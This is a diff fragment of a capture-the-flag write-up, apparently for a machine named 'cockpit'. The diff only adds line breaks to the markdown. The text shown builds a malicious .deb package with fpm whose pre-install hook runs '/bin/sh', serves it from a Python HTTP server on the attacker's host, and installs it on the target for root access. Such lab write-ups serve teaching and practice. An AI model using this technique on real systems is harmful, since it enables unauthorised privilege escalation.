@@ -106,14 +106,14 @@ echo 'exec /bin/sh' > $TF/x.sh
 fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF```
 ![mal deb package](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/creating_mal_packgae.png)
 
-We now have our malicous package on our host and we can now transfer to our target.
+We now have our malicous package on our host and we can now transfer to our target.<br>
 Start your python server: `python3 -m http.server 8000`
 ![python transfer](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/python_server_for_mal_package.png)
 
-Download the malicous package on your target.
-NB: Make sure you are in a writable directory like `/tmp`.
+Download the malicous package on your target.<br>
+NB: Make sure you are in a writable directory like `/tmp`. <br>
 
-![python transfer download](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/downloading_mal_package_from_attacker_server.png)
+![python transfer download](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/downloading_mal_package_from_attacker_server.png) 
 
 Now we can execute and get root access.
 ![iamroot](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/i_am_root.png)
